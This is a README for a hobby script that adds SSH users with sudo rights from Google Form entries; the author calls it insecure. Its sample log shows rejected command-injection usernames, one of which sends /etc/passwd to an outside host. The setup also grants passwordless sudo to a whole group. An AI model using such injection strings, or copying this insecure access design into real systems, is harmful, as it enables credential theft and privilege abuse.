# Gdocs User Manager
This script manages ssh user and sudo access via... GOOGLE DOCS!

The way this works is simple:
1. A user logs into their work gmail account.
2. Once logged in, they can see a Google Form, which allows them to input the following three things for themselves:
  * full name
  * ssh username
  * ssh public key
3. A service runs in the backend of a linux host that scans the form. If it sees valid inputs for a user, it adds the system user.
4. An administer can also edit the spreadsheet and toggle some additional "hidden flags" that do things like purge a user from the system.

This is just a proof-of-concept and has security issues. Please don't use it for anything other than for fun.

For production you should use ldap + kerberos. That's the industry standard for managing ssh access.

## Why in the world...
This project was the result of brainstorming ideas for solving the following problems:

1. Allow an authenticated user to self-manage their ssh-keys
2. Allow an engineer with NO shell/linux experience to administer those users
3. Easily control access to those engineers
4. Be near real-time (less than 5 minutes from update to rollout)
5. Zero time from engineers spent rolling out keys

Google Forms/Sheets is actually a good choice for this project. Everyone knows how it works. It has incredible uptime and uses secure endpoints. It also has a well-documented API and allows for a staggering 10 million requests a day _for free_. That means you can have almost 7000 hosts update every minute using a free api key!

The Form allowed a simple way for everyone in the organization to update (read: self-service) their own API key. It forced authentication and was about as easy to use as it gets.

The backend to Google Forms is actually just a spreadsheet that's easy to read and parse. Write access to the spreadsheet can be "shared" with someone else at the company and they can manage it without needing any linux experience.

## Requirements
You'll need the following things:
1. The script in this repo
2. The install script.
3. A google API user w/ credentials

## Let's get started
### Create the Google Form
You'll need to create a form that has the following text boxes. These are case sensitive so please make sure they match exactly. Or you can change the lines in the script to be your custom field.

* ```SSH username```
* ```Username```
* ```SSH Public Key```

On the document, make sure you check only the following two boxes:
* Require <ORGANIZATION> login to view this form
* Automatically collect respondent's <ORGANIZATION username
* Only allow one response per person (requires login)
* Allow responders to edit responses after submitting

Name your document and save the name, you'll use it later on when setting environment variables.

### Create a Google API key
While logged into your organizational email, you'll need to create an API key and then activate google drive API
1. Log into the gmail account that you want to use with this service
2. Go to the Google Developer's Console: https://code.google.com/apis/console
3. Click on "Credentials" under "APIs & auth"
4. Click "Create new Client ID"

That will download your credentials file, which has the necessary information to make API calls out to Google. Download that file and keep it safe.

After that you'll need to authorize the google drive API
1. Click on "APIs" under "APIs & auth"
2. Search for "Drive API" and click on it
3. Click "activate"

### Share the Form backend with your API email
This step is important or else you won't be able to see any documents when you make API calls.

Find the Google spreadsheet that's created automatically by your Form. The title of this document is what you'll set the environment variable ```DOCUMENT_TITLE``` to on your system.

While you have the document open, share it with the email address that's provided in your credentials file. Again, this step is important! Or else you'll look for documents with the API and won't find any!

### Install the packages
If you're running ubuntu you can simply execute the install script:
```bash
$ ./install_on_ubuntu
...
```

### Set your sudoers file to allow sudo without password
Create a new file called ```/etc/sudoers.d/usermanager and add the following line:
```
%sudo ALL=NOPASSWD: ALL
```

This will allow users to who part of the "sudo" group to sudo without passwords. This isn't strictly necessary but the script automatically adds users to this group.

### Set your environment variables
This script uses the environment variable ```CREDENTIALS_FILE```. This variable must be a full-path to your credentials file that you got back from Google.

The second variable you'll need to set is ```DOCUMENT_TITLE```. This is the the name of the spreadsheet that serves as the "backend" to your Google form. For example ```SSH Access Request```.

## Phew. All set up.
Take a deep breath and hold on to you butts. The script should execute without any problems. It will add users if they are specified in the document.

```
[WARNING] Adding stephen to system
[WARNING] Adding Alice to system
[WARNING] Adding Frank to system
```

If somebody used a non-safe username, then you'll see errors like this:
```
[WARNING] Invalid user "; touch /tmp/pwned". Username must contain letters only!
[WARNING] Invalid user "; curl -XPOST http://mydomain.com -d@/etc/passwd". Username must contain letters only!
```

# Last words and warnings
I want to reiterate again that this was just a fun experiment and not fit for production. I do think there's value to using forms such as this and the API to scrape and do things with data, but not for ssh user access.

There are a few security issues:
1. Almost without exception should you never shell-out with user-supplied data.
2. There's no granularity. This grants sudo access to everyone who can submit a form
3. I did my best to sanitize the user inputs, but I don't trust it. Does anyone know of a better python library for this?
